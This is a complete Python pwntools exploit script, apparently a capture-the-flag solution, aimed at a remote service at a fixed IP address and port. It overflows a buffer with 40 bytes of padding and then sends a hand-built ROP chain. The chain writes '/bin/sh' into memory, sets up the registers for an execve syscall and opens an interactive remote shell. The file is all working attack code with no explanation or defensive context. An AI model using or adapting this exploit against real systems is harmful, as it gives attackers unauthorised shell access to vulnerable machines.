#!/usr/bin/env python2
from pwn import *
from struct import pack


host = "140.115.59.7"
port = 11003

yuan = remote(host,port)

p = "a"*40

p += pack('<Q', 0x00000000004017a7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0060) # @ .data
p += pack('<Q', 0x000000000044d0f4) # pop rax ; ret
p += '/bin/sh\x00'
p += pack('<Q', 0x0000000000467991) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401693) # pop rdi ; ret
p += pack('<Q', 0x00000000006c0060) # @ .data
p += pack('<Q', 0x00000000004017a7) # pop rsi ; ret
p += p64(0)
p += pack('<Q', 0x0000000000437045) # pop rdx ; ret
p += p64(0)
p += pack('<Q', 0x000000000044d0f4) # pop rax ; ret
p += pack('<Q', 0x000000000000003b)
p += pack('<Q', 0x000000000045b365) # syscall ; ret

yuan.sendline(p)
yuan.interactive()
